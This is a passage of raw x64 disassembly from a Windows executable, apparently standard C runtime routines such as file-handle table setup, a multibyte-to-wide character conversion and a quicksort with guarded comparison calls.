   14000a9ca:	85 c0                	test   %eax,%eax
   14000a9cc:	75 07                	jne    0x14000a9d5
   14000a9ce:	b8 00 02 00 00       	mov    $0x200,%eax
   14000a9d3:	eb 05                	jmp    0x14000a9da
   14000a9d5:	3b c7                	cmp    %edi,%eax
   14000a9d7:	0f 4c c7             	cmovl  %edi,%eax
   14000a9da:	48 63 c8             	movslq %eax,%rcx
   14000a9dd:	ba 08 00 00 00       	mov    $0x8,%edx
   14000a9e2:	89 05 38 12 01 00    	mov    %eax,0x11238(%rip)        # 0x14001bc20
   14000a9e8:	e8 e7 c1 ff ff       	call   0x140006bd4
   14000a9ed:	33 c9                	xor    %ecx,%ecx
   14000a9ef:	48 89 05 32 12 01 00 	mov    %rax,0x11232(%rip)        # 0x14001bc28
   14000a9f6:	e8 51 c2 ff ff       	call   0x140006c4c
   14000a9fb:	48 39 1d 26 12 01 00 	cmp    %rbx,0x11226(%rip)        # 0x14001bc28
   14000aa02:	75 2f                	jne    0x14000aa33
   14000aa04:	ba 08 00 00 00       	mov    $0x8,%edx
   14000aa09:	89 3d 11 12 01 00    	mov    %edi,0x11211(%rip)        # 0x14001bc20
   14000aa0f:	48 8b cf             	mov    %rdi,%rcx
   14000aa12:	e8 bd c1 ff ff       	call   0x140006bd4
   14000aa17:	33 c9                	xor    %ecx,%ecx
   14000aa19:	48 89 05 08 12 01 00 	mov    %rax,0x11208(%rip)        # 0x14001bc28
   14000aa20:	e8 27 c2 ff ff       	call   0x140006c4c
   14000aa25:	48 39 1d fc 11 01 00 	cmp    %rbx,0x111fc(%rip)        # 0x14001bc28
   14000aa2c:	75 05                	jne    0x14000aa33
   14000aa2e:	83 c8 ff             	or     $0xffffffff,%eax
   14000aa31:	eb 75                	jmp    0x14000aaa8
   14000aa33:	48 8b eb             	mov    %rbx,%rbp
   14000aa36:	48 8d 35 db fd 00 00 	lea    0xfddb(%rip),%rsi        # 0x14001a818
   14000aa3d:	4c 8d 35 bc fd 00 00 	lea    0xfdbc(%rip),%r14        # 0x14001a800
   14000aa44:	49 8d 4e 30          	lea    0x30(%r14),%rcx
   14000aa48:	45 33 c0             	xor    %r8d,%r8d
   14000aa4b:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   14000aa50:	e8 b3 f4 ff ff       	call   0x140009f08
   14000aa55:	48 8b 05 cc 11 01 00 	mov    0x111cc(%rip),%rax        # 0x14001bc28
   14000aa5c:	4c 8d 05 cd 0b 01 00 	lea    0x10bcd(%rip),%r8        # 0x14001b630
   14000aa63:	48 8b d5             	mov    %rbp,%rdx
   14000aa66:	48 c1 fa 06          	sar    $0x6,%rdx
   14000aa6a:	4c 89 34 03          	mov    %r14,(%rbx,%rax,1)
   14000aa6e:	48 8b c5             	mov    %rbp,%rax
   14000aa71:	83 e0 3f             	and    $0x3f,%eax
   14000aa74:	48 8d 0c c0          	lea    (%rax,%rax,8),%rcx
   14000aa78:	49 8b 04 d0          	mov    (%r8,%rdx,8),%rax
   14000aa7c:	48 8b 4c c8 28       	mov    0x28(%rax,%rcx,8),%rcx
   14000aa81:	48 83 c1 02          	add    $0x2,%rcx
   14000aa85:	48 83 f9 02          	cmp    $0x2,%rcx
   14000aa89:	77 06                	ja     0x14000aa91
   14000aa8b:	c7 06 fe ff ff ff    	movl   $0xfffffffe,(%rsi)
   14000aa91:	48 ff c5             	inc    %rbp
   14000aa94:	49 83 c6 58          	add    $0x58,%r14
   14000aa98:	48 83 c3 08          	add    $0x8,%rbx
   14000aa9c:	48 83 c6 58          	add    $0x58,%rsi
   14000aaa0:	48 83 ef 01          	sub    $0x1,%rdi
   14000aaa4:	75 9e                	jne    0x14000aa44
   14000aaa6:	33 c0                	xor    %eax,%eax
   14000aaa8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000aaad:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000aab2:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000aab7:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   14000aabc:	48 83 c4 20          	add    $0x20,%rsp
   14000aac0:	41 5e                	pop    %r14
   14000aac2:	c3                   	ret
   14000aac3:	cc                   	int3
   14000aac4:	40 53                	rex push %rbx
   14000aac6:	48 83 ec 20          	sub    $0x20,%rsp
   14000aaca:	e8 cd fe ff ff       	call   0x14000a99c
   14000aacf:	e8 74 22 00 00       	call   0x14000cd48
   14000aad4:	33 db                	xor    %ebx,%ebx
   14000aad6:	48 8b 0d 4b 11 01 00 	mov    0x1114b(%rip),%rcx        # 0x14001bc28
   14000aadd:	48 8b 0c 0b          	mov    (%rbx,%rcx,1),%rcx
   14000aae1:	e8 16 23 00 00       	call   0x14000cdfc
   14000aae6:	48 8b 05 3b 11 01 00 	mov    0x1113b(%rip),%rax        # 0x14001bc28
   14000aaed:	48 8b 0c 03          	mov    (%rbx,%rax,1),%rcx
   14000aaf1:	48 83 c1 30          	add    $0x30,%rcx
   14000aaf5:	ff 15 fd 55 00 00    	call   *0x55fd(%rip)        # 0x1400100f8
   14000aafb:	48 83 c3 08          	add    $0x8,%rbx
   14000aaff:	48 83 fb 18          	cmp    $0x18,%rbx
   14000ab03:	75 d1                	jne    0x14000aad6
   14000ab05:	48 8b 0d 1c 11 01 00 	mov    0x1111c(%rip),%rcx        # 0x14001bc28
   14000ab0c:	e8 3b c1 ff ff       	call   0x140006c4c
   14000ab11:	48 83 25 0f 11 01 00 	andq   $0x0,0x1110f(%rip)        # 0x14001bc28
   14000ab18:	00 
   14000ab19:	48 83 c4 20          	add    $0x20,%rsp
   14000ab1d:	5b                   	pop    %rbx
   14000ab1e:	c3                   	ret
   14000ab1f:	cc                   	int3
   14000ab20:	48 83 c1 30          	add    $0x30,%rcx
   14000ab24:	48 ff 25 bd 55 00 00 	rex.W jmp *0x55bd(%rip)        # 0x1400100e8
   14000ab2b:	cc                   	int3
   14000ab2c:	48 83 c1 30          	add    $0x30,%rcx
   14000ab30:	48 ff 25 b9 55 00 00 	rex.W jmp *0x55b9(%rip)        # 0x1400100f0
   14000ab37:	cc                   	int3
   14000ab38:	40 53                	rex push %rbx
   14000ab3a:	48 83 ec 20          	sub    $0x20,%rsp
   14000ab3e:	48 8b 05 f3 0e 01 00 	mov    0x10ef3(%rip),%rax        # 0x14001ba38
   14000ab45:	48 8b da             	mov    %rdx,%rbx
   14000ab48:	48 39 02             	cmp    %rax,(%rdx)
   14000ab4b:	74 16                	je     0x14000ab63
   14000ab4d:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   14000ab53:	85 05 97 fc 00 00    	test   %eax,0xfc97(%rip)        # 0x14001a7f0
   14000ab59:	75 08                	jne    0x14000ab63
   14000ab5b:	e8 6c ef ff ff       	call   0x140009acc
   14000ab60:	48 89 03             	mov    %rax,(%rbx)
   14000ab63:	48 83 c4 20          	add    $0x20,%rsp
   14000ab67:	5b                   	pop    %rbx
   14000ab68:	c3                   	ret
   14000ab69:	cc                   	int3
   14000ab6a:	cc                   	int3
   14000ab6b:	cc                   	int3
   14000ab6c:	40 53                	rex push %rbx
   14000ab6e:	48 83 ec 20          	sub    $0x20,%rsp
   14000ab72:	48 8d 05 bf 0e 01 00 	lea    0x10ebf(%rip),%rax        # 0x14001ba38
   14000ab79:	48 8b da             	mov    %rdx,%rbx
   14000ab7c:	4a 8b 04 c0          	mov    (%rax,%r8,8),%rax
   14000ab80:	48 39 02             	cmp    %rax,(%rdx)
   14000ab83:	74 16                	je     0x14000ab9b
   14000ab85:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   14000ab8b:	85 05 5f fc 00 00    	test   %eax,0xfc5f(%rip)        # 0x14001a7f0
   14000ab91:	75 08                	jne    0x14000ab9b
   14000ab93:	e8 34 ef ff ff       	call   0x140009acc
   14000ab98:	48 89 03             	mov    %rax,(%rbx)
   14000ab9b:	48 83 c4 20          	add    $0x20,%rsp
   14000ab9f:	5b                   	pop    %rbx
   14000aba0:	c3                   	ret
   14000aba1:	cc                   	int3
   14000aba2:	cc                   	int3
   14000aba3:	cc                   	int3
   14000aba4:	40 53                	rex push %rbx
   14000aba6:	48 83 ec 20          	sub    $0x20,%rsp
   14000abaa:	48 8b 05 27 08 01 00 	mov    0x10827(%rip),%rax        # 0x14001b3d8
   14000abb1:	48 8b da             	mov    %rdx,%rbx
   14000abb4:	48 39 02             	cmp    %rax,(%rdx)
   14000abb7:	74 16                	je     0x14000abcf
   14000abb9:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   14000abbf:	85 05 2b fc 00 00    	test   %eax,0xfc2b(%rip)        # 0x14001a7f0
   14000abc5:	75 08                	jne    0x14000abcf
   14000abc7:	e8 2c d6 ff ff       	call   0x1400081f8
   14000abcc:	48 89 03             	mov    %rax,(%rbx)
   14000abcf:	48 83 c4 20          	add    $0x20,%rsp
   14000abd3:	5b                   	pop    %rbx
   14000abd4:	c3                   	ret
   14000abd5:	cc                   	int3
   14000abd6:	cc                   	int3
   14000abd7:	cc                   	int3
   14000abd8:	40 53                	rex push %rbx
   14000abda:	48 83 ec 20          	sub    $0x20,%rsp
   14000abde:	48 8d 05 f3 07 01 00 	lea    0x107f3(%rip),%rax        # 0x14001b3d8
   14000abe5:	48 8b da             	mov    %rdx,%rbx
   14000abe8:	4a 8b 04 c0          	mov    (%rax,%r8,8),%rax
   14000abec:	48 39 02             	cmp    %rax,(%rdx)
   14000abef:	74 16                	je     0x14000ac07
   14000abf1:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   14000abf7:	85 05 f3 fb 00 00    	test   %eax,0xfbf3(%rip)        # 0x14001a7f0
   14000abfd:	75 08                	jne    0x14000ac07
   14000abff:	e8 f4 d5 ff ff       	call   0x1400081f8
   14000ac04:	48 89 03             	mov    %rax,(%rbx)
   14000ac07:	48 83 c4 20          	add    $0x20,%rsp
   14000ac0b:	5b                   	pop    %rbx
   14000ac0c:	c3                   	ret
   14000ac0d:	cc                   	int3
   14000ac0e:	cc                   	int3
   14000ac0f:	cc                   	int3
   14000ac10:	48 8b c4             	mov    %rsp,%rax
   14000ac13:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000ac17:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000ac1b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000ac1f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000ac23:	41 56                	push   %r14
   14000ac25:	48 83 ec 30          	sub    $0x30,%rsp
   14000ac29:	45 33 f6             	xor    %r14d,%r14d
   14000ac2c:	49 8b d9             	mov    %r9,%rbx
   14000ac2f:	49 8b e8             	mov    %r8,%rbp
   14000ac32:	48 8b f2             	mov    %rdx,%rsi
   14000ac35:	48 8b f9             	mov    %rcx,%rdi
   14000ac38:	48 85 d2             	test   %rdx,%rdx
   14000ac3b:	0f 84 23 01 00 00    	je     0x14000ad64
   14000ac41:	4d 85 c0             	test   %r8,%r8
   14000ac44:	0f 84 1a 01 00 00    	je     0x14000ad64
   14000ac4a:	44 38 32             	cmp    %r14b,(%rdx)
   14000ac4d:	75 12                	jne    0x14000ac61
   14000ac4f:	48 85 c9             	test   %rcx,%rcx
   14000ac52:	0f 84 13 01 00 00    	je     0x14000ad6b
   14000ac58:	66 44 89 31          	mov    %r14w,(%rcx)
   14000ac5c:	e9 0a 01 00 00       	jmp    0x14000ad6b
   14000ac61:	45 38 71 28          	cmp    %r14b,0x28(%r9)
   14000ac65:	75 08                	jne    0x14000ac6f
   14000ac67:	48 8b cb             	mov    %rbx,%rcx
   14000ac6a:	e8 71 b2 ff ff       	call   0x140005ee0
   14000ac6f:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   14000ac73:	44 8b 52 0c          	mov    0xc(%rdx),%r10d
   14000ac77:	41 81 fa e9 fd 00 00 	cmp    $0xfde9,%r10d
   14000ac7e:	75 27                	jne    0x14000aca7
   14000ac80:	4c 8d 0d b9 0f 01 00 	lea    0x10fb9(%rip),%r9        # 0x14001bc40
   14000ac87:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000ac8c:	4c 8b c5             	mov    %rbp,%r8
   14000ac8f:	48 8b d6             	mov    %rsi,%rdx
   14000ac92:	48 8b cf             	mov    %rdi,%rcx
   14000ac95:	e8 06 22 00 00       	call   0x14000cea0
   14000ac9a:	83 c9 ff             	or     $0xffffffff,%ecx
   14000ac9d:	85 c0                	test   %eax,%eax
   14000ac9f:	0f 48 c1             	cmovs  %ecx,%eax
   14000aca2:	e9 c6 00 00 00       	jmp    0x14000ad6d
   14000aca7:	4c 39 b2 38 01 00 00 	cmp    %r14,0x138(%rdx)
   14000acae:	75 14                	jne    0x14000acc4
   14000acb0:	48 85 ff             	test   %rdi,%rdi
   14000acb3:	0f 84 a4 00 00 00    	je     0x14000ad5d
   14000acb9:	0f b6 06             	movzbl (%rsi),%eax
   14000acbc:	66 89 07             	mov    %ax,(%rdi)
   14000acbf:	e9 99 00 00 00       	jmp    0x14000ad5d
   14000acc4:	0f b6 0e             	movzbl (%rsi),%ecx
   14000acc7:	48 8b 02             	mov    (%rdx),%rax
   14000acca:	66 44 39 34 48       	cmp    %r14w,(%rax,%rcx,2)
   14000accf:	7d 61                	jge    0x14000ad32
   14000acd1:	44 8b 4a 08          	mov    0x8(%rdx),%r9d
   14000acd5:	41 83 f9 01          	cmp    $0x1,%r9d
   14000acd9:	7e 2b                	jle    0x14000ad06
   14000acdb:	41 3b e9             	cmp    %r9d,%ebp
   14000acde:	7c 26                	jl     0x14000ad06
   14000ace0:	41 8b c6             	mov    %r14d,%eax
   14000ace3:	48 85 ff             	test   %rdi,%rdi
   14000ace6:	4c 8b c6             	mov    %rsi,%r8
   14000ace9:	ba 09 00 00 00       	mov    $0x9,%edx
   14000acee:	0f 95 c0             	setne  %al
   14000acf1:	41 8b ca             	mov    %r10d,%ecx
   14000acf4:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000acf8:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000acfd:	e8 5a d8 ff ff       	call   0x14000855c
   14000ad02:	85 c0                	test   %eax,%eax
   14000ad04:	75 13                	jne    0x14000ad19
   14000ad06:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000ad0a:	48 63 48 08          	movslq 0x8(%rax),%rcx
   14000ad0e:	48 3b e9             	cmp    %rcx,%rbp
   14000ad11:	72 0f                	jb     0x14000ad22
   14000ad13:	44 38 76 01          	cmp    %r14b,0x1(%rsi)
   14000ad17:	74 09                	je     0x14000ad22
   14000ad19:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000ad1d:	8b 40 08             	mov    0x8(%rax),%eax
   14000ad20:	eb 4b                	jmp    0x14000ad6d
   14000ad22:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   14000ad26:	83 c8 ff             	or     $0xffffffff,%eax
   14000ad29:	c7 43 2c 2a 00 00 00 	movl   $0x2a,0x2c(%rbx)
   14000ad30:	eb 3b                	jmp    0x14000ad6d
   14000ad32:	41 8b c6             	mov    %r14d,%eax
   14000ad35:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   14000ad3b:	48 85 ff             	test   %rdi,%rdi
   14000ad3e:	4c 8b c6             	mov    %rsi,%r8
   14000ad41:	41 8b ca             	mov    %r10d,%ecx
   14000ad44:	0f 95 c0             	setne  %al
   14000ad47:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000ad4b:	41 8d 51 08          	lea    0x8(%r9),%edx
   14000ad4f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000ad54:	e8 03 d8 ff ff       	call   0x14000855c
   14000ad59:	85 c0                	test   %eax,%eax
   14000ad5b:	74 c5                	je     0x14000ad22
   14000ad5d:	b8 01 00 00 00       	mov    $0x1,%eax
   14000ad62:	eb 09                	jmp    0x14000ad6d
   14000ad64:	4c 89 35 d5 0e 01 00 	mov    %r14,0x10ed5(%rip)        # 0x14001bc40
   14000ad6b:	33 c0                	xor    %eax,%eax
   14000ad6d:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000ad72:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   14000ad77:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   14000ad7c:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   14000ad81:	48 83 c4 30          	add    $0x30,%rsp
   14000ad85:	41 5e                	pop    %r14
   14000ad87:	c3                   	ret
   14000ad88:	48 83 ec 28          	sub    $0x28,%rsp
   14000ad8c:	48 85 c9             	test   %rcx,%rcx
   14000ad8f:	75 15                	jne    0x14000ada6
   14000ad91:	e8 1e be ff ff       	call   0x140006bb4
   14000ad96:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000ad9c:	e8 d7 bc ff ff       	call   0x140006a78
   14000ada1:	83 c8 ff             	or     $0xffffffff,%eax
   14000ada4:	eb 04                	jmp    0x14000adaa
   14000ada6:	8b 41 18             	mov    0x18(%rcx),%eax
   14000ada9:	90                   	nop
   14000adaa:	48 83 c4 28          	add    $0x28,%rsp
   14000adae:	c3                   	ret
   14000adaf:	cc                   	int3
   14000adb0:	41 54                	push   %r12
   14000adb2:	41 55                	push   %r13
   14000adb4:	41 56                	push   %r14
   14000adb6:	48 81 ec 50 04 00 00 	sub    $0x450,%rsp
   14000adbd:	48 8b 05 3c f2 00 00 	mov    0xf23c(%rip),%rax        # 0x14001a000
   14000adc4:	48 33 c4             	xor    %rsp,%rax
   14000adc7:	48 89 84 24 10 04 00 	mov    %rax,0x410(%rsp)
   14000adce:	00 
   14000adcf:	4d 8b e1             	mov    %r9,%r12
   14000add2:	4d 8b f0             	mov    %r8,%r14
   14000add5:	4c 8b e9             	mov    %rcx,%r13
   14000add8:	48 85 c9             	test   %rcx,%rcx
   14000addb:	75 1a                	jne    0x14000adf7
   14000addd:	48 85 d2             	test   %rdx,%rdx
   14000ade0:	74 15                	je     0x14000adf7
   14000ade2:	e8 cd bd ff ff       	call   0x140006bb4
   14000ade7:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000aded:	e8 86 bc ff ff       	call   0x140006a78
   14000adf2:	e9 a9 03 00 00       	jmp    0x14000b1a0
   14000adf7:	4d 85 f6             	test   %r14,%r14
   14000adfa:	74 e6                	je     0x14000ade2
   14000adfc:	4d 85 e4             	test   %r12,%r12
   14000adff:	74 e1                	je     0x14000ade2
   14000ae01:	48 83 fa 02          	cmp    $0x2,%rdx
   14000ae05:	0f 82 95 03 00 00    	jb     0x14000b1a0
   14000ae0b:	48 89 9c 24 48 04 00 	mov    %rbx,0x448(%rsp)
   14000ae12:	00 
   14000ae13:	48 89 ac 24 40 04 00 	mov    %rbp,0x440(%rsp)
   14000ae1a:	00 
   14000ae1b:	48 89 b4 24 38 04 00 	mov    %rsi,0x438(%rsp)
   14000ae22:	00 
   14000ae23:	48 89 bc 24 30 04 00 	mov    %rdi,0x430(%rsp)
   14000ae2a:	00 
   14000ae2b:	4c 89 bc 24 28 04 00 	mov    %r15,0x428(%rsp)
   14000ae32:	00 
   14000ae33:	4c 8d 7a ff          	lea    -0x1(%rdx),%r15
   14000ae37:	4d 0f af fe          	imul   %r14,%r15
   14000ae3b:	4c 03 f9             	add    %rcx,%r15
   14000ae3e:	33 c9                	xor    %ecx,%ecx
   14000ae40:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000ae45:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   14000ae4c:	00 00 00 00 
   14000ae50:	33 d2                	xor    %edx,%edx
   14000ae52:	49 8b c7             	mov    %r15,%rax
   14000ae55:	49 2b c5             	sub    %r13,%rax
   14000ae58:	49 f7 f6             	div    %r14
   14000ae5b:	48 8d 58 01          	lea    0x1(%rax),%rbx
   14000ae5f:	48 83 fb 08          	cmp    $0x8,%rbx
   14000ae63:	0f 87 9b 00 00 00    	ja     0x14000af04
   14000ae69:	4d 3b fd             	cmp    %r13,%r15
   14000ae6c:	76 75                	jbe    0x14000aee3
   14000ae6e:	4b 8d 34 2e          	lea    (%r14,%r13,1),%rsi
   14000ae72:	49 8b dd             	mov    %r13,%rbx
   14000ae75:	48 8b fe             	mov    %rsi,%rdi
   14000ae78:	49 3b f7             	cmp    %r15,%rsi
   14000ae7b:	77 2a                	ja     0x14000aea7
   14000ae7d:	0f 1f 00             	nopl   (%rax)
   14000ae80:	49 ba 70 89 de 5e 95 	movabs $0x9375b7955ede8970,%r10
   14000ae87:	b7 75 93 
   14000ae8a:	48 8b d3             	mov    %rbx,%rdx
   14000ae8d:	48 8b cf             	mov    %rdi,%rcx
   14000ae90:	49 8b c4             	mov    %r12,%rax
   14000ae93:	ff 15 27 54 00 00    	call   *0x5427(%rip)        # 0x1400102c0
   14000ae99:	85 c0                	test   %eax,%eax
   14000ae9b:	48 0f 4f df          	cmovg  %rdi,%rbx
   14000ae9f:	49 03 fe             	add    %r14,%rdi
   14000aea2:	49 3b ff             	cmp    %r15,%rdi
   14000aea5:	76 d9                	jbe    0x14000ae80
   14000aea7:	4d 8b c6             	mov    %r14,%r8
   14000aeaa:	49 8b d7             	mov    %r15,%rdx
   14000aead:	49 3b df             	cmp    %r15,%rbx
   14000aeb0:	74 24                	je     0x14000aed6
   14000aeb2:	49 2b df             	sub    %r15,%rbx
   14000aeb5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   14000aebc:	00 00 00 00 
   14000aec0:	0f b6 02             	movzbl (%rdx),%eax
   14000aec3:	0f b6 0c 13          	movzbl (%rbx,%rdx,1),%ecx
   14000aec7:	88 04 13             	mov    %al,(%rbx,%rdx,1)
   14000aeca:	88 0a                	mov    %cl,(%rdx)
   14000aecc:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   14000aed0:	49 83 e8 01          	sub    $0x1,%r8
   14000aed4:	75 ea                	jne    0x14000aec0
   14000aed6:	4d 2b fe             	sub    %r14,%r15
   14000aed9:	4d 3b fd             	cmp    %r13,%r15
   14000aedc:	77 94                	ja     0x14000ae72
   14000aede:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000aee3:	48 83 e9 01          	sub    $0x1,%rcx
   14000aee7:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000aeec:	0f 88 86 02 00 00    	js     0x14000b178
   14000aef2:	4c 8b 6c cc 30       	mov    0x30(%rsp,%rcx,8),%r13
   14000aef7:	4c 8b bc cc 20 02 00 	mov    0x220(%rsp,%rcx,8),%r15
   14000aefe:	00 
   14000aeff:	e9 4c ff ff ff       	jmp    0x14000ae50
   14000af04:	48 d1 eb             	shr    $1,%rbx
   14000af07:	49 0f af de          	imul   %r14,%rbx
   14000af0b:	4a 8d 34 2b          	lea    (%rbx,%r13,1),%rsi
   14000af0f:	49 ba 70 89 de 5e 95 	movabs $0x9375b7955ede8970,%r10
   14000af16:	b7 75 93 
   14000af19:	48 8b d6             	mov    %rsi,%rdx
   14000af1c:	49 8b cd             	mov    %r13,%rcx
   14000af1f:	49 8b c4             	mov    %r12,%rax
   14000af22:	ff 15 98 53 00 00    	call   *0x5398(%rip)        # 0x1400102c0
   14000af28:	85 c0                	test   %eax,%eax
   14000af2a:	7e 2f                	jle    0x14000af5b
   14000af2c:	4d 8b ce             	mov    %r14,%r9
   14000af2f:	4c 8b c6             	mov    %rsi,%r8
   14000af32:	4c 3b ee             	cmp    %rsi,%r13
   14000af35:	74 24                	je     0x14000af5b
   14000af37:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000af3e:	00 00 
   14000af40:	41 0f b6 00          	movzbl (%r8),%eax
   14000af44:	49 8b d0             	mov    %r8,%rdx
   14000af47:	48 2b d3             	sub    %rbx,%rdx
   14000af4a:	0f b6 0a             	movzbl (%rdx),%ecx
   14000af4d:	88 02                	mov    %al,(%rdx)
   14000af4f:	41 88 08             	mov    %cl,(%r8)
   14000af52:	49 ff c0             	inc    %r8
   14000af55:	49 83 e9 01          	sub    $0x1,%r9
   14000af59:	75 e5                	jne    0x14000af40
   14000af5b:	49 ba 70 89 de 5e 95 	movabs $0x9375b7955ede8970,%r10
   14000af62:	b7 75 93 
   14000af65:	49 8b d7             	mov    %r15,%rdx
   14000af68:	49 8b cd             	mov    %r13,%rcx
   14000af6b:	49 8b c4             	mov    %r12,%rax
   14000af6e:	ff 15 4c 53 00 00    	call   *0x534c(%rip)        # 0x1400102c0
   14000af74:	85 c0                	test   %eax,%eax
   14000af76:	7e 30                	jle    0x14000afa8
   14000af78:	4d 8b c6             	mov    %r14,%r8
   14000af7b:	49 8b d7             	mov    %r15,%rdx
   14000af7e:	4d 3b ef             	cmp    %r15,%r13
   14000af81:	74 25                	je     0x14000afa8
   14000af83:	4d 8b cd             	mov    %r13,%r9
   14000af86:	4d 2b cf             	sub    %r15,%r9
   14000af89:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   14000af90:	0f b6 02             	movzbl (%rdx),%eax
   14000af93:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   14000af98:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   14000af9c:	88 0a                	mov    %cl,(%rdx)
   14000af9e:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   14000afa2:	49 83 e8 01          	sub    $0x1,%r8
   14000afa6:	75 e8                	jne    0x14000af90
   14000afa8:	49 ba 70 89 de 5e 95 	movabs $0x9375b7955ede8970,%r10
   14000afaf:	b7 75 93 
   14000afb2:	49 8b d7             	mov    %r15,%rdx
   14000afb5:	48 8b ce             	mov    %rsi,%rcx
   14000afb8:	49 8b c4             	mov    %r12,%rax
   14000afbb:	ff 15 ff 52 00 00    	call   *0x52ff(%rip)        # 0x1400102c0
   14000afc1:	85 c0                	test   %eax,%eax
   14000afc3:	7e 33                	jle    0x14000aff8
   14000afc5:	4d 8b c6             	mov    %r14,%r8
   14000afc8:	49 8b d7             	mov    %r15,%rdx
   14000afcb:	49 3b f7             	cmp    %r15,%rsi
   14000afce:	74 28                	je     0x14000aff8
   14000afd0:	4c 8b ce             	mov    %rsi,%r9
   14000afd3:	4d 2b cf             	sub    %r15,%r9
   14000afd6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000afdd:	00 00 00 
   14000afe0:	0f b6 02             	movzbl (%rdx),%eax
   14000afe3:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   14000afe8:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   14000afec:	88 0a                	mov    %cl,(%rdx)
   14000afee:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   14000aff2:	49 83 e8 01          	sub    $0x1,%r8
   14000aff6:	75 e8                	jne    0x14000afe0
   14000aff8:	49 8b dd             	mov    %r13,%rbx
   14000affb:	49 8b ff             	mov    %r15,%rdi
   14000affe:	66 90                	xchg   %ax,%ax
   14000b000:	48 3b f3             	cmp    %rbx,%rsi
   14000b003:	76 2b                	jbe    0x14000b030
   14000b005:	49 03 de             	add    %r14,%rbx
   14000b008:	48 3b de             	cmp    %rsi,%rbx
   14000b00b:	73 23                	jae    0x14000b030
   14000b00d:	49 ba 70 89 de 5e 95 	movabs $0x9375b7955ede8970,%r10
   14000b014:	b7 75 93 
   14000b017:	48 8b d6             	mov    %rsi,%rdx
   14000b01a:	48 8b cb             	mov    %rbx,%rcx
   14000b01d:	49 8b c4             	mov    %r12,%rax
   14000b020:	ff 15 9a 52 00 00    	call   *0x529a(%rip)        # 0x1400102c0
   14000b026:	85 c0                	test   %eax,%eax
   14000b028:	7e db                	jle    0x14000b005
   14000b02a:	eb 29                	jmp    0x14000b055
   14000b02c:	0f 1f 40 00          	nopl   0x0(%rax)
   14000b030:	49 03 de             	add    %r14,%rbx
   14000b033:	49 3b df             	cmp    %r15,%rbx
   14000b036:	77 1d                	ja     0x14000b055
   14000b038:	49 ba 70 89 de 5e 95 	movabs $0x9375b7955ede8970,%r10
   14000b03f:	b7 75 93 
   14000b042:	48 8b d6             	mov    %rsi,%rdx
   14000b045:	48 8b cb             	mov    %rbx,%rcx
   14000b048:	49 8b c4             	mov    %r12,%rax
   14000b04b:	ff 15 6f 52 00 00    	call   *0x526f(%rip)        # 0x1400102c0
   14000b051:	85 c0                	test   %eax,%eax
   14000b053:	7e db                	jle    0x14000b030
   14000b055:	48 8b ef             	mov    %rdi,%rbp
   14000b058:	49 2b fe             	sub    %r14,%rdi
   14000b05b:	48 3b fe             	cmp    %rsi,%rdi
   14000b05e:	76 1d                	jbe    0x14000b07d
   14000b060:	49 ba 70 89 de 5e 95 	movabs $0x9375b7955ede8970,%r10
   14000b067:	b7 75 93 
   14000b06a:	48 8b d6             	mov    %rsi,%rdx
   14000b06d:	48 8b cf             	mov    %rdi,%rcx
   14000b070:	49 8b c4             	mov    %r12,%rax
   14000b073:	ff 15 47 52 00 00    	call   *0x5247(%rip)        # 0x1400102c0
   14000b079:	85 c0                	test   %eax,%eax
   14000b07b:	7f d8                	jg     0x14000b055
   14000b07d:	48 3b fb             	cmp    %rbx,%rdi
   14000b080:	72 38                	jb     0x14000b0ba
   14000b082:	4d 8b c6             	mov    %r14,%r8
   14000b085:	48 8b d7             	mov    %rdi,%rdx
   14000b088:	74 1e                	je     0x14000b0a8
   14000b08a:	4c 8b cb             	mov    %rbx,%r9
   14000b08d:	4c 2b cf             	sub    %rdi,%r9
   14000b090:	0f b6 02             	movzbl (%rdx),%eax
   14000b093:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   14000b098:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   14000b09c:	88 0a                	mov    %cl,(%rdx)
   14000b09e:	48 8d 52 01          	lea    0x1(%rdx),%rdx
